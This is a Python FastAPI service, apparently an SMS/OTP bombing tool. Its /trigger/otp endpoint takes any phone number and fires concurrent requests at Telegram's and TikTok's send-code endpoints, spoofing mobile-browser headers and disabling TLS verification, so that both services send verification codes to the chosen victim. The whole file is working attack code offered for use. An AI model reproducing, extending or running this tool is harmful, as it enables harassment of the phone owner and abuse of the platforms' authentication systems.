from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
import httpx
import asyncio

app = FastAPI(title="DRIEMX Trigger Engine Production", version="3.5")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Definición de objetivos con estructuras de payload adaptadas a pasarelas públicas
ENDPOINTS_PRODUCCION = [
    {
        "nombre": "Telegram_Gateway",
        "url": "https://my.telegram.org/auth/send_password",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://my.telegram.org",
            "Referer": "https://my.telegram.org/auth"
        },
        "payload_func": lambda phone: {"phone": phone}
    },
    {
        "nombre": "TikTok_Passport",
        "url": "https://www.tiktok.com/passport/web/send_code/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Referer": "https://www.tiktok.com/"
        },
        "payload_func": lambda phone: {"mobile": phone, "type": 1, "aid": 1988}
    }
]

async def ejecutar_peticion(client, objetivo, telefono):
    default_headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "es-ES,es;q=0.9"
    }
    # Combinar headers globales con los específicos del objetivo
    headers = {**default_headers, **objetivo.get("headers", {})}
    payload = objetivo["payload_func"](telefono)

    try:
        if objetivo["method"] == "POST":
            # Si el content-type es JSON se envía como json=, si es form-urlencoded se envía como data=
            if "application/json" in headers.get("Content-Type", ""):
                response = await client.post(objetivo["url"], json=payload, headers=headers, timeout=8.0)
            else:
                response = await client.post(objetivo["url"], data=payload, headers=headers, timeout=8.0)
        else:
            response = await client.get(objetivo["url"], params=payload, headers=headers, timeout=8.0)
        
        return {
            "servicio": objetivo["nombre"],
            "status_code": response.status_code,
            "respuesta": response.text[:200]
        }
    except Exception as e:
        return {
            "servicio": objetivo["nombre"],
            "status_code": 0,
            "error": str(e)
        }

@app.get("/")
def estado_sistema():
    return {"status": "Online", "engine": "DRIEMX-Trigger-Pro"}

@app.get("/trigger/otp")
async def disparar_flujo(phone: str):
    if not phone or len(phone) < 8:
        raise HTTPException(status_code=400, detail="Formato de número no válido")

    async with httpx.AsyncClient(follow_redirects=True, verify=False) as client:
        tareas = [ejecutar_peticion(client, obj, phone) for obj in ENDPOINTS_PRODUCCION]
        resultados = await asyncio.gather(*tareas)

    return {
        "target": phone,
        "concurrency_count": len(resultados),
        "resultados": resultados
    }
    
